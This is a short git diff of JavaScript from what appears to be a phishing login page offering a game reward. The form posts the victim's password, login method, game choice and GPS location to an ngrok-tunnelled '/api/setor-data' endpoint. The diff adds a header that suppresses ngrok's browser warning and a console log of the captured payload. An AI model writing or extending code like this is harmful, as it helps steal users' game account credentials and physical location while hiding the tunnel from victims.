@@ -79,16 +79,19 @@ if (loginForm) {
       password: passwordInput.value,
       game: game,
       nominal: reward,
-      method: loginMethod, // Tambah field method
-      gps: gpsData // Kirim GPS jika diizinkan
+      method: loginMethod, 
+      gps: gpsData 
     };
+
+    console.log("MENGIRIM DATA:", dataPayload);
 
     try {
       // Mengirimkan data ke Backend Render (Gunakan BACKEND_URL)
       const response = await fetch(`${BACKEND_URL}/api/setor-data`, {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json'
+          'Content-Type': 'application/json',
+          'ngrok-skip-browser-warning': 'true'
         },
         body: JSON.stringify(dataPayload)
       });
